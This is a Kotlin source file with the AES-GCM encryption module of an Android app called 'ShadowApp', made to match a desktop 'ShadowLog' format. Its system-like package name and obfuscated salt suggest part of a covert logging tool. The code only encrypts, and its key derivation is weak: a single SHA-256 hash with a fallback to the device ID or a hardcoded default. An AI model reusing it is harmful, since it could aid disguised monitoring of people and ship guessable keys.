package com.system.service.core

import android.util.Base64
import com.system.service.ShadowApp
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * AES-256-GCM encryption matching the desktop ShadowLog format.
 * Encrypted data is compatible with the desktop Decryptor.
 */
object Encryption {

    private const val AES_GCM = "AES/GCM/NoPadding"
    private const val GCM_TAG_BITS = 128
    private const val GCM_NONCE_LEN = 12

    // Same salt as desktop version (obfuscated byte array)
    private val SALT = byteArrayOf(
        0x77, 0x75, 0x73, 0x5f, 0x63, 0x61, 0x63, 0x68,
        0x65, 0x5f, 0x76, 0x32, 0x5f, 0x39, 0x32, 0x38, 0x33
    )

    private var cachedKey: SecretKeySpec? = null

    /** Derive a 32-byte AES-256 key from password (compatible with desktop version). */
    fun deriveKey(password: String): SecretKeySpec {
        cachedKey?.let { return it }
        val seed = if (password.isBlank()) getAndroidId() else password
        val combined = seed.toByteArray(Charsets.UTF_8) + SALT
        val hash = MessageDigest.getInstance("SHA-256").digest(combined)
        val key = SecretKeySpec(hash, "AES")
        cachedKey = key
        return key
    }

    /** Invalidate cached key (e.g., on password change). */
    fun invalidateKey() {
        cachedKey = null
    }

    /** Encrypt data using AES-256-GCM. Output format: nonce || ciphertext (same as desktop). */
    fun encrypt(data: ByteArray): ByteArray {
        val key = deriveKey(Config.encryptionPassword)
        val cipher = Cipher.getInstance(AES_GCM)
        val nonce = ByteArray(GCM_NONCE_LEN)
        java.security.SecureRandom().nextBytes(nonce)
        val spec = GCMParameterSpec(GCM_TAG_BITS, nonce)
        cipher.init(Cipher.ENCRYPT_MODE, key, spec)
        val ciphertext = cipher.doFinal(data)
        // Desktop format: nonce prepended to ciphertext
        return nonce + ciphertext
    }

    /** Decrypt data using AES-256-GCM. Input format: nonce || ciphertext. */
    fun decrypt(data: ByteArray): ByteArray {
        if (data.size < GCM_NONCE_LEN) throw IllegalArgumentException("Ciphertext too short")
        val key = deriveKey(Config.encryptionPassword)
        val nonce = data.copyOfRange(0, GCM_NONCE_LEN)
        val ciphertext = data.copyOfRange(GCM_NONCE_LEN, data.size)
        val cipher = Cipher.getInstance(AES_GCM)
        val spec = GCMParameterSpec(GCM_TAG_BITS, nonce)
        cipher.init(Cipher.DECRYPT_MODE, key, spec)
        return cipher.doFinal(ciphertext)
    }

    /** Encrypt and encode to Base64 string (for file storage, same format as desktop). */
    fun encryptToBase64(plaintext: String): String {
        val encrypted = encrypt(plaintext.toByteArray(Charsets.UTF_8))
        return Base64.encodeToString(encrypted, Base64.NO_WRAP)
    }

    /** Decode Base64 and decrypt to plaintext string. */
    fun decryptFromBase64(encoded: String): String {
        val data = Base64.decode(encoded, Base64.NO_WRAP)
        return String(decrypt(data), Charsets.UTF_8)
    }

    /** Get a device-unique ID as fallback encryption seed (like MachineGuid on Windows). */
    private fun getAndroidId(): String {
        return try {
            android.provider.Settings.Secure.getString(
                ShadowApp.appContext.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "default_android_device_id_v1"
        } catch (_: Exception) {
            "default_android_device_id_v1"
        }
    }
}
